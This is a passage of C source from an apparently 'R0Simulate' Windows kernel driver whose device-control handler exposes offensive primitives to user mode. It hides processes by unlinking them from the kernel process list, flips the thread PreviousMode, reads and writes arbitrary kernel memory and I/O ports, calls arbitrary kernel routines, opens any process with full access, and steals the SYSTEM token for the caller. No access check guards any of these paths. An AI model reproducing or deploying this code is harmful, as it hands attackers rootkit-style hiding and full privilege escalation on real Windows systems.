            default: status = STATUS_NOT_SUPPORTED;
        }
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        status = GetExceptionCode();
    }

    if (ReturnValue) *ReturnValue = ret;
    if (stackMem) ExFreePoolWithTag(stackMem, '0SR0');
    return status;
}

static NTSTATUS PreviousModeSwitch(PVOID InputBuffer, ULONG InputSize,
                                   PVOID OutputBuffer, ULONG OutputSize,
                                   PULONG_PTR Info) {
    __try {
        if (InputSize < sizeof(PREVIOUS_MODE_SWITCH_INPUT) || !InputBuffer)
            return STATUS_INVALID_PARAMETER;
        PPREVIOUS_MODE_SWITCH_INPUT pInput = (PPREVIOUS_MODE_SWITCH_INPUT)InputBuffer;
        if (OutputSize < sizeof(PREVIOUS_MODE_SWITCH_OUTPUT))
            return STATUS_BUFFER_TOO_SMALL;

        PETHREAD pEThread = PsGetCurrentThread();
        if (!pEThread) return STATUS_UNSUCCESSFUL;

        PUCHAR pPrevMode = (PUCHAR)pEThread + g_PreviousModeOffset;
        UCHAR oldMode = *pPrevMode;
        UCHAR newMode = oldMode;

        if (pInput->ViewOnly == 0) {
            if (pInput->Mode != R0SPMS_MODE_KERNEL && pInput->Mode != R0SPMS_MODE_USER)
                return STATUS_INVALID_PARAMETER;
            newMode = pInput->Mode;
            *pPrevMode = newMode;
        }

        PPREVIOUS_MODE_SWITCH_OUTPUT pOutput = (PPREVIOUS_MODE_SWITCH_OUTPUT)OutputBuffer;
        pOutput->Status = STATUS_SUCCESS;
        pOutput->OldMode = oldMode;
        pOutput->NewMode = newMode;
        *Info = sizeof(PREVIOUS_MODE_SWITCH_OUTPUT);
        return STATUS_SUCCESS;
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        return GetExceptionCode();
    }
}

static NTSTATUS ProcessHiding(PVOID InputBuffer, ULONG InputSize,
                              PVOID OutputBuffer, ULONG OutputSize,
                              PULONG_PTR Info) {
    NTSTATUS status = STATUS_SUCCESS;
    __try {
        if (!InputBuffer || InputSize < sizeof(PROCESS_HIDING_INPUT))
            return STATUS_INVALID_PARAMETER;

        PPROCESS_HIDING_INPUT pIn = (PPROCESS_HIDING_INPUT)InputBuffer;
        UCHAR op = pIn->Operation;
        if (op != R0SKPH_OP_ADD && op != R0SKPH_OP_REMOVE && op != R0SKPH_OP_LIST)
            return STATUS_INVALID_PARAMETER;

        if (op == R0SKPH_OP_ADD) {
            if (InputSize < sizeof(PROCESS_HIDING_INPUT) + sizeof(ULONG))
                return STATUS_BUFFER_TOO_SMALL;
            ULONG pid = *(PULONG)((PUCHAR)InputBuffer + sizeof(PROCESS_HIDING_INPUT));
            if (pid == 0) return STATUS_INVALID_PARAMETER;

            PEPROCESS pTarget = NULL;
            status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)pid, &pTarget);
            if (!NT_SUCCESS(status)) return status;

            KIRQL oldIrql;
            BOOLEAN alreadyHidden = FALSE;
            KeAcquireSpinLock(&g_HiddenListLock, &oldIrql);
            __try {
                PLIST_ENTRY pList = g_HiddenListHead.Flink;
                while (pList != &g_HiddenListHead) {
                    PHIDDEN_PROCESS_ENTRY pCur = CONTAINING_RECORD(pList, HIDDEN_PROCESS_ENTRY, ListEntry);
                    if ((ULONG)(ULONG_PTR)pCur->ProcessId == pid) {
                        alreadyHidden = TRUE;
                        break;
                    }
                    pList = pList->Flink;
                }
            } __finally {
                KeReleaseSpinLock(&g_HiddenListLock, oldIrql);
            }

            if (alreadyHidden) {
                ObDereferenceObject(pTarget);
                return STATUS_ALREADY_COMMITTED;
            }

            PHIDDEN_PROCESS_ENTRY pEntry = (PHIDDEN_PROCESS_ENTRY)ExAllocatePoolWithTag(NonPagedPool, sizeof(HIDDEN_PROCESS_ENTRY), 'HIDE');
            if (!pEntry) {
                ObDereferenceObject(pTarget);
                return STATUS_INSUFFICIENT_RESOURCES;
            }
            RtlZeroMemory(pEntry, sizeof(HIDDEN_PROCESS_ENTRY));
            pEntry->ProcessId = (HANDLE)(ULONG_PTR)pid;
            pEntry->EProcess = pTarget;

            PLIST_ENTRY pLink = (PLIST_ENTRY)((PCHAR)pTarget + g_ActiveProcessLinksOffset);
            RemoveEntryList(pLink);

            KeAcquireSpinLock(&g_HiddenListLock, &oldIrql);
            __try {
                InsertHeadList(&g_HiddenListHead, &pEntry->ListEntry);
            } __finally {
                KeReleaseSpinLock(&g_HiddenListLock, oldIrql);
            }

            if (OutputSize >= sizeof(NTSTATUS)) {
                *(NTSTATUS*)OutputBuffer = STATUS_SUCCESS;
                *Info = sizeof(NTSTATUS);
            } else *Info = 0;
            return STATUS_SUCCESS;
        }

        if (op == R0SKPH_OP_REMOVE) {
            if (InputSize < sizeof(PROCESS_HIDING_INPUT) + sizeof(ULONG))
                return STATUS_BUFFER_TOO_SMALL;
            ULONG pid = *(PULONG)((PUCHAR)InputBuffer + sizeof(PROCESS_HIDING_INPUT));
            if (pid == 0) return STATUS_INVALID_PARAMETER;

            KIRQL oldIrql;
            PHIDDEN_PROCESS_ENTRY pEntry = NULL;
            KeAcquireSpinLock(&g_HiddenListLock, &oldIrql);
            __try {
                PLIST_ENTRY pList = g_HiddenListHead.Flink;
                while (pList != &g_HiddenListHead) {
                    PHIDDEN_PROCESS_ENTRY pCur = CONTAINING_RECORD(pList, HIDDEN_PROCESS_ENTRY, ListEntry);
                    if ((ULONG)(ULONG_PTR)pCur->ProcessId == pid) {
                        pEntry = pCur;
                        RemoveEntryList(&pEntry->ListEntry);
                        break;
                    }
                    pList = pList->Flink;
                }
            } __finally {
                KeReleaseSpinLock(&g_HiddenListLock, oldIrql);
            }

            if (!pEntry) {
                if (OutputSize >= sizeof(NTSTATUS)) {
                    *(NTSTATUS*)OutputBuffer = STATUS_NOT_FOUND;
                    *Info = sizeof(NTSTATUS);
                } else *Info = 0;
                return STATUS_NOT_FOUND;
            }

            PEPROCESS pProc = pEntry->EProcess;
            if (pProc) {
                PLIST_ENTRY pLink = (PLIST_ENTRY)((PCHAR)pProc + g_ActiveProcessLinksOffset);
                PEPROCESS pSys = PsInitialSystemProcess;
                PLIST_ENTRY pSysLink = (PLIST_ENTRY)((PCHAR)pSys + g_ActiveProcessLinksOffset);
                InsertHeadList(pSysLink, pLink);
                ObDereferenceObject(pProc);
            }
            ExFreePoolWithTag(pEntry, 'HIDE');

            if (OutputSize >= sizeof(NTSTATUS)) {
                *(NTSTATUS*)OutputBuffer = STATUS_SUCCESS;
                *Info = sizeof(NTSTATUS);
            } else *Info = 0;
            return STATUS_SUCCESS;
        }

        if (op == R0SKPH_OP_LIST) {
            ULONG maxCount = 0;
            if (OutputSize >= sizeof(ULONG))
                maxCount = (OutputSize - sizeof(ULONG)) / sizeof(HANDLE);

            KIRQL oldIrql;
            ULONG count = 0;
            KeAcquireSpinLock(&g_HiddenListLock, &oldIrql);
            __try {
                PLIST_ENTRY pList = g_HiddenListHead.Flink;
                while (pList != &g_HiddenListHead && count < maxCount) {
                    PHIDDEN_PROCESS_ENTRY pCur = CONTAINING_RECORD(pList, HIDDEN_PROCESS_ENTRY, ListEntry);
                    ((HANDLE*)((PUCHAR)OutputBuffer + sizeof(ULONG)))[count] = pCur->ProcessId;
                    count++;
                    pList = pList->Flink;
                }
            } __finally {
                KeReleaseSpinLock(&g_HiddenListLock, oldIrql);
            }

            if (OutputSize >= sizeof(ULONG)) {
                *(ULONG*)OutputBuffer = count;
                *Info = sizeof(ULONG) + count * sizeof(HANDLE);
            } else {
                *Info = 0;
                return STATUS_BUFFER_TOO_SMALL;
            }
            return STATUS_SUCCESS;
        }

        return STATUS_INVALID_PARAMETER;
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        return GetExceptionCode();
    }
}

static NTSTATUS KernelMemoryAccess(PVOID InputBuffer, ULONG InputSize,
                                   PVOID OutputBuffer, ULONG OutputSize,
                                   PULONG_PTR Info) {
    __try {
        if (InputSize < sizeof(KERNEL_MEMORY_ACCESS_INPUT) || !InputBuffer)
            return STATUS_INVALID_PARAMETER;

        PKERNEL_MEMORY_ACCESS_INPUT pIn = (PKERNEL_MEMORY_ACCESS_INPUT)InputBuffer;
        if (pIn->Length == 0 || (pIn->Operation != R0SKMA_OP_READ && pIn->Operation != R0SKMA_OP_WRITE))
            return STATUS_INVALID_PARAMETER;

        if (InputSize < sizeof(KERNEL_MEMORY_ACCESS_INPUT) + pIn->Length)
            return STATUS_BUFFER_TOO_SMALL;
        if (pIn->Operation == R0SKMA_OP_READ && OutputSize < sizeof(KERNEL_MEMORY_ACCESS_INPUT) + pIn->Length)
            return STATUS_BUFFER_TOO_SMALL;

        PVOID target = (PVOID)((ULONG_PTR)pIn->Address + pIn->Offset);
        PVOID dataBuffer = pIn->Data;
        NTSTATUS opStatus = STATUS_SUCCESS;

        __try {
            if (pIn->Operation == R0SKMA_OP_READ) {
                RtlCopyMemory(dataBuffer, target, pIn->Length);
            } else {
                RtlCopyMemory(target, dataBuffer, pIn->Length);
            }
        } __except(EXCEPTION_EXECUTE_HANDLER) {
            opStatus = GetExceptionCode();
        }

        *Info = sizeof(KERNEL_MEMORY_ACCESS_INPUT) + pIn->Length;
        return opStatus;
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        return GetExceptionCode();
    }
}

static NTSTATUS GetSystemToken(PVOID InputBuffer, ULONG InputSize,
                               PVOID OutputBuffer, ULONG OutputSize,
                               PULONG_PTR Info) {
    NTSTATUS status = STATUS_SUCCESS;
    HANDLE systemProcessHandle = NULL;
    HANDLE tokenHandle = NULL;
    HANDLE dupTokenHandle = NULL;
    PEPROCESS targetProcess = NULL;
    OBJECT_ATTRIBUTES objAttr;
    CLIENT_ID clientId;
    PGET_SYSTEM_TOKEN_INPUT pIn = NULL;
    PGET_SYSTEM_TOKEN_OUTPUT pOut = NULL;
    PROCESS_ACCESS_TOKEN accessToken = {0};
    UCHAR savedByte = 0;

    __try {
        if (InputSize < sizeof(GET_SYSTEM_TOKEN_INPUT) || !InputBuffer ||
            OutputSize < sizeof(GET_SYSTEM_TOKEN_OUTPUT)) {
            status = STATUS_INVALID_PARAMETER;
            goto cleanup;
        }
        pIn = (PGET_SYSTEM_TOKEN_INPUT)InputBuffer;
        pOut = (PGET_SYSTEM_TOKEN_OUTPUT)OutputBuffer;

        if (g_PrimaryTokenFrozenOffset == 0) {
            status = STATUS_UNSUCCESSFUL;
            goto cleanup;
        }

        targetProcess = PsGetCurrentProcess();
        if (!targetProcess) {
            status = STATUS_UNSUCCESSFUL;
            goto cleanup;
        }

        InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
        clientId.UniqueProcess = (HANDLE)4;
        clientId.UniqueThread = NULL;
        status = ZwOpenProcess(&systemProcessHandle, PROCESS_QUERY_INFORMATION, &objAttr, &clientId);
        if (!NT_SUCCESS(status)) goto cleanup;

        status = ZwOpenProcessToken(systemProcessHandle, TOKEN_QUERY | TOKEN_DUPLICATE, &tokenHandle);
        if (!NT_SUCCESS(status)) goto cleanup;

        status = ZwDuplicateToken(tokenHandle, TOKEN_ALL_ACCESS, NULL, FALSE, TokenPrimary, &dupTokenHandle);
        if (!NT_SUCCESS(status)) goto cleanup;

        if (pIn->ReplaceToken) {
            __try {
                savedByte = ((PUCHAR)targetProcess)[g_PrimaryTokenFrozenOffset];
                ((PUCHAR)targetProcess)[g_PrimaryTokenFrozenOffset] = 0x50;
            } __except(EXCEPTION_EXECUTE_HANDLER) {
                status = GetExceptionCode();
                goto cleanup;
            }

            accessToken.Token = dupTokenHandle;
            accessToken.Thread = NULL;
            status = ZwSetInformationProcess(
                ZwCurrentProcess(),
                ProcessAccessToken,
                &accessToken,
                sizeof(accessToken)
            );

            __try {
                ((PUCHAR)targetProcess)[g_PrimaryTokenFrozenOffset] = savedByte;
            } __except(EXCEPTION_EXECUTE_HANDLER) {
            }

            if (NT_SUCCESS(status)) {
                pOut->Status = STATUS_SUCCESS;
                pOut->TokenHandle = NULL;
                ZwClose(dupTokenHandle);
                dupTokenHandle = NULL;
            } else {
                pOut->Status = status;
                pOut->TokenHandle = NULL;
            }
        } else {
            pOut->Status = STATUS_SUCCESS;
            pOut->TokenHandle = dupTokenHandle;
            dupTokenHandle = NULL;
        }

        *Info = sizeof(GET_SYSTEM_TOKEN_OUTPUT);
        status = STATUS_SUCCESS;

cleanup:
        if (!NT_SUCCESS(status)) {
            if (OutputSize >= sizeof(GET_SYSTEM_TOKEN_OUTPUT) && pOut) {
                pOut->Status = status;
                pOut->TokenHandle = NULL;
                *Info = sizeof(GET_SYSTEM_TOKEN_OUTPUT);
            }
        }

        if (systemProcessHandle) ZwClose(systemProcessHandle);
        if (tokenHandle) ZwClose(tokenHandle);
        if (dupTokenHandle) ZwClose(dupTokenHandle);
        return status;
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        status = GetExceptionCode();
        if (systemProcessHandle) ZwClose(systemProcessHandle);
        if (tokenHandle) ZwClose(tokenHandle);
        if (dupTokenHandle) ZwClose(dupTokenHandle);
        if (OutputSize >= sizeof(GET_SYSTEM_TOKEN_OUTPUT) && pOut) {
            pOut->Status = status;
            pOut->TokenHandle = NULL;
            *Info = sizeof(GET_SYSTEM_TOKEN_OUTPUT);
        }
        return status;
    }
}

static NTSTATUS SetInternalVariables(
    PVOID InputBuffer,
    ULONG InputSize,
    PVOID OutputBuffer,
    ULONG OutputSize,
    PULONG_PTR Info)
{
    NTSTATUS status = STATUS_SUCCESS;
    __try {
        if (InputSize < sizeof(SET_INTERNAL_VAR_INPUT) || !InputBuffer)
            return STATUS_INVALID_PARAMETER;

        PSET_INTERNAL_VAR_INPUT pIn = (PSET_INTERNAL_VAR_INPUT)InputBuffer;
        ULONG op = pIn->Operation;

        VAR_DESC* pDesc = g_VarDesc;
        while (pDesc->Id != 0) {
            if (pDesc->Id == pIn->VariableId) break;
            pDesc++;
        }
        if (pDesc->Id == 0 && op != 3) {
            return STATUS_INVALID_PARAMETER;
        }

        switch (op) {
            case 1: {
                if (OutputSize < sizeof(UINT64)) {
                    return STATUS_BUFFER_TOO_SMALL;
                }
                UINT64 val = 0;
                if (pDesc->Size == sizeof(ULONG)) {
                    val = *(ULONG*)pDesc->Address;
                } else if (pDesc->Size == sizeof(UINT64)) {
                    val = *(UINT64*)pDesc->Address;
                } else {
                    RtlCopyMemory(&val, pDesc->Address, pDesc->Size);
                }
                *(UINT64*)OutputBuffer = val;
                *Info = sizeof(UINT64);
                return STATUS_SUCCESS;
            }
            case 2: {
                if (pDesc->Id == R0SIMULATE_VAR_USE_PARSED_MODE) {
                    if (pIn->Value != 0 && pIn->Value != 1) {
                        return STATUS_INVALID_PARAMETER;
                    }
                }
                if (pDesc->Size == sizeof(ULONG)) {
                    *(ULONG*)pDesc->Address = (ULONG)pIn->Value;
                } else if (pDesc->Size == sizeof(UINT64)) {
                    *(UINT64*)pDesc->Address = pIn->Value;
                } else {
                    RtlCopyMemory(pDesc->Address, &pIn->Value, pDesc->Size);
                }
                *Info = 0;
                return STATUS_SUCCESS;
            }
            case 3: {
                ULONG count = 0;
                VAR_DESC* p = g_VarDesc;
                while (p->Id != 0) { count++; p++; }

                ULONG required = sizeof(ULONG) + count * sizeof(VAR_INFO);
                if (OutputSize < required) {
                    return STATUS_BUFFER_TOO_SMALL;
                }

                *(ULONG*)OutputBuffer = count;
                PVAR_INFO pOutVar = (PVAR_INFO)((PUCHAR)OutputBuffer + sizeof(ULONG));

                p = g_VarDesc;
                for (ULONG i = 0; i < count; i++, p++) {
                    pOutVar[i].Id = p->Id;
                    pOutVar[i].Size = p->Size;
                    UINT64 val = 0;
                    if (p->Size == sizeof(ULONG)) {
                        val = *(ULONG*)p->Address;
                    } else if (p->Size == sizeof(UINT64)) {
                        val = *(UINT64*)p->Address;
                    } else {
                        RtlCopyMemory(&val, p->Address, p->Size);
                    }
                    pOutVar[i].Value = val;
                    wcsncpy_s(pOutVar[i].Name, sizeof(pOutVar[i].Name) / sizeof(WCHAR), p->Name, _TRUNCATE);
                }
                *Info = required;
                return STATUS_SUCCESS;
            }
            default:
                return STATUS_INVALID_PARAMETER;
        }
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        return GetExceptionCode();
    }
}

static NTSTATUS GetKernelFunction(
    PVOID InputBuffer,
    ULONG InputSize,
    PVOID OutputBuffer,
    ULONG OutputSize,
    PULONG_PTR Info)
{
    NTSTATUS status = STATUS_SUCCESS;
    __try {
        if (!g_FunctionTableBuilt) {
            KIRQL oldIrql;
            KeAcquireSpinLock(&g_FunctionTableLock, &oldIrql);
            if (!g_FunctionTableBuilt) {
                status = LazyBuildFunctionTable();
                if (NT_SUCCESS(status)) {
                    g_FunctionTableBuilt = TRUE;
                } else {
                    DbgPrint("[R0S] GetKernelFunction: LazyBuild failed: 0x%08X\n", status);
                }
            }
            KeReleaseSpinLock(&g_FunctionTableLock, oldIrql);
            if (!NT_SUCCESS(status))
                return status;
        }

        if (InputSize < sizeof(ULONG) || !InputBuffer)
            return STATUS_INVALID_PARAMETER;

        PGET_KERNEL_FUNCTION_INPUT pIn = (PGET_KERNEL_FUNCTION_INPUT)InputBuffer;
        ULONG nameLen = pIn->NameLength;

        if (nameLen > 0) {
            if (InputSize < sizeof(GET_KERNEL_FUNCTION_INPUT) + nameLen - 1)
                return STATUS_BUFFER_TOO_SMALL;
            if (OutputSize < sizeof(UINT64))
                return STATUS_BUFFER_TOO_SMALL;

            UNICODE_STRING uniName;
            RtlInitUnicodeString(&uniName, pIn->Name);

            UINT64 address = 0;
            KIRQL oldIrql;
            KeAcquireSpinLock(&g_FunctionTableLock, &oldIrql);
            PLIST_ENTRY pList = g_FunctionTableHead.Flink;
            while (pList != &g_FunctionTableHead) {
                PFUNCTION_ENTRY pNode = CONTAINING_RECORD(pList, FUNCTION_ENTRY, ListEntry);
                if (RtlCompareUnicodeString(&pNode->Name, &uniName, TRUE) == 0) {
                    address = (UINT64)(ULONG_PTR)pNode->Address;
                    break;
                }
                pList = pList->Flink;
            }
            KeReleaseSpinLock(&g_FunctionTableLock, oldIrql);

            if (address == 0) {
                return STATUS_NOT_FOUND;
            }

            *(PUINT64)OutputBuffer = address;
            *Info = sizeof(UINT64);
            return STATUS_SUCCESS;
        } else {
            ULONG count = 0;
            KIRQL oldIrql;
            KeAcquireSpinLock(&g_FunctionTableLock, &oldIrql);
            PLIST_ENTRY pList = g_FunctionTableHead.Flink;
            while (pList != &g_FunctionTableHead) {
                count++;
                pList = pList->Flink;
            }
            KeReleaseSpinLock(&g_FunctionTableLock, oldIrql);

            ULONG requiredSize = sizeof(ULONG) + count * sizeof(KERNEL_FUNCTION_ENTRY);
            if (OutputSize < requiredSize) {
                *Info = requiredSize;
                return STATUS_BUFFER_TOO_SMALL;
            }

            *(PULONG)OutputBuffer = count;
            PKERNEL_FUNCTION_ENTRY pEntry = (PKERNEL_FUNCTION_ENTRY)((PUCHAR)OutputBuffer + sizeof(ULONG));

            KeAcquireSpinLock(&g_FunctionTableLock, &oldIrql);
            pList = g_FunctionTableHead.Flink;
            ULONG idx = 0;
            while (pList != &g_FunctionTableHead && idx < count) {
                PFUNCTION_ENTRY pNode = CONTAINING_RECORD(pList, FUNCTION_ENTRY, ListEntry);
                pEntry[idx].Address = (UINT64)(ULONG_PTR)pNode->Address;
                ULONG nameLenChars = (pNode->Name.Length / sizeof(WCHAR));
                if (nameLenChars >= 64) nameLenChars = 63;
                RtlCopyMemory(pEntry[idx].Name, pNode->Name.Buffer, nameLenChars * sizeof(WCHAR));
                pEntry[idx].Name[nameLenChars] = L'\0';
                idx++;
                pList = pList->Flink;
            }
            KeReleaseSpinLock(&g_FunctionTableLock, oldIrql);

            *Info = requiredSize;
            return STATUS_SUCCESS;
        }
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        return GetExceptionCode();
    }
}

// ------------------ I/O Port Operation ------------------
static NTSTATUS IoPortOperation(
    PVOID InputBuffer,
    ULONG InputSize,
    PVOID OutputBuffer,
    ULONG OutputSize,
    PULONG_PTR Info)
{
    NTSTATUS status = STATUS_SUCCESS;
    __try {
        if (InputSize < sizeof(R0S_IO_INPUT) || !InputBuffer)
            return STATUS_INVALID_PARAMETER;
        if (OutputSize < sizeof(R0S_IO_OUTPUT))
            return STATUS_BUFFER_TOO_SMALL;

        PR0S_IO_INPUT pIn = (PR0S_IO_INPUT)InputBuffer;
        PR0S_IO_OUTPUT pOut = (PR0S_IO_OUTPUT)OutputBuffer;
        ULONG port = pIn->Port;
        ULONG value = 0;
        BOOLEAN writeOp = FALSE;

        switch (pIn->Operation) {
            case R0SIO_READ_BYTE:
                value = READ_PORT_UCHAR((PUCHAR)(ULONG_PTR)port);
                break;
            case R0SIO_READ_WORD:
                value = READ_PORT_USHORT((PUSHORT)(ULONG_PTR)port);
                break;
            case R0SIO_READ_DWORD:
                value = READ_PORT_ULONG((PULONG)(ULONG_PTR)port);
                break;
            case R0SIO_WRITE_BYTE:
                WRITE_PORT_UCHAR((PUCHAR)(ULONG_PTR)port, (UCHAR)pIn->Value);
                writeOp = TRUE;
                break;
            case R0SIO_WRITE_WORD:
                WRITE_PORT_USHORT((PUSHORT)(ULONG_PTR)port, (USHORT)pIn->Value);
                writeOp = TRUE;
                break;
            case R0SIO_WRITE_DWORD:
                WRITE_PORT_ULONG((PULONG)(ULONG_PTR)port, pIn->Value);
                writeOp = TRUE;
                break;
            default:
                return STATUS_INVALID_PARAMETER;
        }

        pOut->Status = STATUS_SUCCESS;
        if (!writeOp) {
            pOut->Value = value;
        } else {
            pOut->Value = 0;
        }
        *Info = sizeof(R0S_IO_OUTPUT);
        return STATUS_SUCCESS;
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        status = GetExceptionCode();
        if (OutputSize >= sizeof(R0S_IO_OUTPUT)) {
            PR0S_IO_OUTPUT pOut = (PR0S_IO_OUTPUT)OutputBuffer;
            pOut->Status = status;
            pOut->Value = 0;
            *Info = sizeof(R0S_IO_OUTPUT);
        }
        return status;
    }
}

// ------------------ Driver Device Control ------------------
NTSTATUS DriverDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    PIO_STACK_LOCATION irpSp = IoGetCurrentIrpStackLocation(Irp);
    NTSTATUS status = STATUS_SUCCESS;
    ULONG_PTR info = 0;
    ULONG code = irpSp->Parameters.DeviceIoControl.IoControlCode;
    PVOID inputBuffer = Irp->AssociatedIrp.SystemBuffer;
    ULONG inputSize = irpSp->Parameters.DeviceIoControl.InputBufferLength;
    PVOID outputBuffer = Irp->AssociatedIrp.SystemBuffer;
    ULONG outputSize = irpSp->Parameters.DeviceIoControl.OutputBufferLength;

    switch (code) {
        case IOCTL_R0SIMULATE_EXEC_INSTRUCTION: {
            __try {
                if (inputSize < sizeof(EXEC_INSTRUCTION_INPUT) || !inputBuffer) {
                    status = STATUS_INVALID_PARAMETER;
                    break;
                }
                PEXEC_INSTRUCTION_INPUT execInput = (PEXEC_INSTRUCTION_INPUT)inputBuffer;
                if (execInput->InstructionSize == 0) {
                    status = STATUS_INVALID_PARAMETER;
                    break;
                }
                if (inputSize < sizeof(EXEC_INSTRUCTION_INPUT) + execInput->InstructionSize - 1) {
                    status = STATUS_BUFFER_TOO_SMALL;
                    break;
                }
                if (outputSize < sizeof(EXEC_INSTRUCTION_OUTPUT)) {
                    status = STATUS_BUFFER_TOO_SMALL;
                    break;
                }
                UINT64 returnValue = 0;
                status = ExecuteInstruction(PsGetCurrentProcess(), execInput->Instruction,
                                            execInput->InstructionSize, &returnValue);
                PEXEC_INSTRUCTION_OUTPUT output = (PEXEC_INSTRUCTION_OUTPUT)outputBuffer;
                output->ReturnValue = returnValue;
                output->Status = status;
                info = sizeof(EXEC_INSTRUCTION_OUTPUT);
            } __except(EXCEPTION_EXECUTE_HANDLER) {
                status = GetExceptionCode();
            }
            break;
        }

        case IOCTL_R0SIMULATE_CALL_KERNEL_API: {
            __try {
                if (inputSize < sizeof(CALL_KERNEL_API_INPUT) || !inputBuffer) {
                    status = STATUS_INVALID_PARAMETER;
                    break;
                }
                PCALL_KERNEL_API_INPUT apiInput = (PCALL_KERNEL_API_INPUT)inputBuffer;
                if (!(apiInput->Flags & R0SIMULATE_FLAG_USE_ADDRESS)) {
                    if (apiInput->ApiNameLength == 0 || apiInput->ApiNameLength > 512 ||
                        inputSize < sizeof(CALL_KERNEL_API_INPUT) + apiInput->ApiNameLength) {
                        status = STATUS_INVALID_PARAMETER;
                        break;
                    }
                    if (apiInput->ApiNameLength % 2 != 0) {
                        status = STATUS_INVALID_PARAMETER;
                        break;
                    }
                }
                if (apiInput->ArgumentCount > 16) {
                    status = STATUS_INVALID_PARAMETER;
                    break;
                }
                if (outputSize < sizeof(CALL_KERNEL_API_OUTPUT)) {
                    status = STATUS_BUFFER_TOO_SMALL;
                    break;
                }

                PVOID apiAddress = NULL;
                if (apiInput->Flags & R0SIMULATE_FLAG_USE_ADDRESS) {
                    UINT64 addr = 0;
                    RtlCopyMemory(&addr, apiInput->ApiName, sizeof(addr));
                    apiAddress = (PVOID)(ULONG_PTR)addr;
                } else {
                    UNICODE_STRING apiName;
                    RtlInitUnicodeString(&apiName, apiInput->ApiName);
                    if (g_UseParsedMode == 1) {
                        if (!g_FunctionTableBuilt) {
                            KIRQL oldIrql;
                            KeAcquireSpinLock(&g_FunctionTableLock, &oldIrql);
                            if (!g_FunctionTableBuilt) {
                                status = LazyBuildFunctionTable();
                                if (NT_SUCCESS(status)) {
                                    g_FunctionTableBuilt = TRUE;
                                } else {
                                    DbgPrint("[R0S] LazyBuildFunctionTable failed: 0x%08X\n", status);
                                }
                            }
                            KeReleaseSpinLock(&g_FunctionTableLock, oldIrql);
                        }
                        if (g_FunctionTableBuilt) {
                            KIRQL oldIrql;
                            KeAcquireSpinLock(&g_FunctionTableLock, &oldIrql);
                            PLIST_ENTRY pList = g_FunctionTableHead.Flink;
                            while (pList != &g_FunctionTableHead) {
                                PFUNCTION_ENTRY pNode = CONTAINING_RECORD(pList, FUNCTION_ENTRY, ListEntry);
                                if (RtlCompareUnicodeString(&pNode->Name, &apiName, TRUE) == 0) {
                                    apiAddress = pNode->Address;
                                    break;
                                }
                                pList = pList->Flink;
                            }
                            KeReleaseSpinLock(&g_FunctionTableLock, oldIrql);
                        }
                    } else {
                        apiAddress = MmGetSystemRoutineAddress(&apiName);
                    }
                    if (!apiAddress) {
                        status = STATUS_NOT_FOUND;
                        break;
                    }
                }

                UINT64 returnValue = 0;
                status = CallKernelApiInternal(apiAddress,
                                               apiInput->ArgumentCount, apiInput->Arguments,
                                               outputBuffer, outputSize, &returnValue);

                PCALL_KERNEL_API_OUTPUT output = (PCALL_KERNEL_API_OUTPUT)outputBuffer;
                output->ReturnValue = returnValue;
                output->Status = status;
                info = sizeof(CALL_KERNEL_API_OUTPUT);
            } __except(EXCEPTION_EXECUTE_HANDLER) {
                status = GetExceptionCode();
            }
            break;
        }

        case IOCTL_R0SIMULATE_KERNEL_PROCESS_HIDING: {
            status = ProcessHiding(inputBuffer, inputSize, outputBuffer, outputSize, &info);
            break;
        }

        case IOCTL_R0SIMULATE_PREVIOUS_MODE_SWITCH: {
            status = PreviousModeSwitch(inputBuffer, inputSize, outputBuffer, outputSize, &info);
            break;
        }

        case IOCTL_R0SIMULATE_KERNEL_OPEN_HANDLE: {
            __try {
                if (inputSize < sizeof(ULONG) || outputSize < sizeof(HANDLE)) {
                    status = STATUS_INVALID_PARAMETER;
                    break;
                }
                ULONG pid = *(PULONG)inputBuffer;
                HANDLE hKernelProcess = NULL;
                OBJECT_ATTRIBUTES oa;
                CLIENT_ID cid;

                InitializeObjectAttributes(&oa, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
                cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
                cid.UniqueThread = NULL;

                status = ZwOpenProcess(&hKernelProcess, PROCESS_ALL_ACCESS, &oa, &cid);
                if (NT_SUCCESS(status)) {
                    HANDLE hUserProcess = NULL;
                    status = ZwDuplicateObject(
                        ZwCurrentProcess(),
                        hKernelProcess,
                        ZwCurrentProcess(),
                        &hUserProcess,
                        PROCESS_ALL_ACCESS,
                        0,
                        0
                    );
                    if (NT_SUCCESS(status)) {
                        *(HANDLE*)outputBuffer = hUserProcess;
                        info = sizeof(HANDLE);
                    }
                    ZwClose(hKernelProcess);
                }
                if (!NT_SUCCESS(status)) {
                    *(HANDLE*)outputBuffer = NULL;
                    info = sizeof(HANDLE);
                }
            } __except(EXCEPTION_EXECUTE_HANDLER) {
                status = GetExceptionCode();
            }
            break;
        }

        case IOCTL_R0SIMULATE_KERNEL_MEMORY_ACCESS: {
            status = KernelMemoryAccess(inputBuffer, inputSize, outputBuffer, outputSize, &info);
            break;
        }

        case IOCTL_R0SIMULATE_GET_SYSTEM_TOKEN: {
            status = GetSystemToken(inputBuffer, inputSize, outputBuffer, outputSize, &info);
            break;
        }

        case IOCTL_R0SIMULATE_SET_INTERNAL_VARS: {
            status = SetInternalVariables(inputBuffer, inputSize, outputBuffer, outputSize, &info);
            break;
        }

        case IOCTL_R0SIMULATE_GET_KERNEL_FUNCTION: {
            status = GetKernelFunction(inputBuffer, inputSize, outputBuffer, outputSize, &info);
            break;
        }

        case IOCTL_R0SIMULATE_IO: {
            status = IoPortOperation(inputBuffer, inputSize, outputBuffer, outputSize, &info);
            break;
        }

        default:
            status = STATUS_INVALID_DEVICE_REQUEST;
            break;
    }

    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = info;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}